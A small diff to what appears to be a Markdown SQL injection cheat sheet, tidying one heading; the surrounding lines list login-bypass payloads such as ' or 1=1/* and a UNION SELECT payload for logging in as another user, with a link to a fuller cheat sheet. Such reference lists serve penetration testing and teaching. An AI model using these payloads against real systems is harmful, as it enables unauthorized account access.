@@ -19,7 +19,7 @@
 * `' or 1=1/*`
 * `') or '1'='1--`
 * `') or ('1'='1--`
-*  Login as different user (SM*)
+*  Login as different user
   `UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
 
 More at https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
